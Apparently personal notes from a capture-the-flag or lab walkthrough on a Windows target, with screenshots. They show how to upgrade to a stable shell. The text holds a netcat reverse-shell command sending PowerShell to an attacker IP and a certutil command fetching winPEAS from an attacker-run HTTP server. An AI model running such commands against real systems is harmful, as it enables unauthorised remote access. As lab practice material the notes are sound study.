https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/windows
Now will get more stable shell for ourself this time 

Will simply locate the NC in kali and will upload that to SMB share as well
![[Pasted image 20230917193621.png]]

Command to be run in the dumb shell
![[Pasted image 20230917194444.png]]
```
Start-Process -FilePath "C:\enterprise-share\nc.exe" -ArgumentList "-nv 10.8.167.78 6666 -e powershell.exe"
```

Let's see if we get the SMART shell or not ?__?
Yeah we got it with some micro-soft rights this time

![[Pasted image 20230917194808.png]]

Let's Run Winpeas and see what we get and if u note earlier we found that the machine is x64
![[Pasted image 20230917201545.png]]

I fired up the server in kali
```
python3 -m http.server 8080 -b 10.8.167.78
```

Which command to run on the windows side to download the file
```
certutil.exe -urlcache -f http://10.8.167.78:8080/winPEASx64_ofs.exe winPEASx64_ofs.exe
```
![[Pasted image 20230917195521.png]]

